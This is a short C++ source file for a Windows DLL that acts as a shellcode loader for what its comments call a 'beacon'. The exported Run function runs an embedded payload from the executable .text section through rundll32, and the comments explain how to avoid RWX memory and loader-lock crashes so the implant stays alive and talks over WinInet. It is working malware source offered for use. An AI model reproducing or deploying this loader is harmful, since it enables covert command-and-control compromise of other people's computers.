#include <windows.h>
#include "pain_shellcode.h"

// PainSC::Data lives in .text (r-x) - no VirtualAlloc/RWX needed.
//
// Run() calls the shellcode directly on the thread rundll32 uses for the export
// dispatch (already fully initialized, no loader-lock timing issues).
// The shellcode's Start() loops forever so Run() never returns, keeping
// rundll32.exe alive for the lifetime of the beacon.
//
// Do NOT call CreateThread from DllMain(DLL_PROCESS_ATTACH): on Windows 11
// the new thread starts while DLL init is still in progress, and WinInet's
// thread pool behaves differently when HttpSendRequestW is called from a
// loader-spawned thread, causing STATUS_STACK_BUFFER_OVERRUN on the second
// TppWorkerThread.
//
// Invoke: rundll32.exe pain.dll,Run

extern "C" BOOL WINAPI DllMain(HINSTANCE, DWORD, LPVOID) {
    return TRUE;
}

extern "C" __declspec(dllexport) void Run(void) {
    void (*sc)(void) = (void(*)(void))PainSC::Data;
    sc();
}
